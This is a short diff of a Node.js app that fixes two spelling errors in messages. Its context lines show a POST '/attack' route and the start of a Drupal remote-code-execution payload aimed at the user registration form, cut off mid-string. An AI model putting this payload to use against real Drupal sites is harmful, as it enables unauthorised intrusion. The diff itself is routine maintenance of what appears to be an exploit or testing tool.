@@ -32,7 +32,7 @@ var masterSalt = "";
 if(process.env.MASTER_SALT){ 
 	masterSalt=process.env.MASTER_SALT;
 } else {
-	console.log('Expected MASTER_SALT env varaible to be set');
+	console.log('Expected MASTER_SALT env variable to be set');
 }
 
 var dataCh1 = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]="
@@ -100,7 +100,7 @@ app.post('/attack',async (req, res) => {
 			responseMessage = err.message;
 		}
 		else{
-			responseMessage = "An unknown error occured";
+			responseMessage = "An unknown error occurred";
 		}
 
 		console.log(responseMessage);
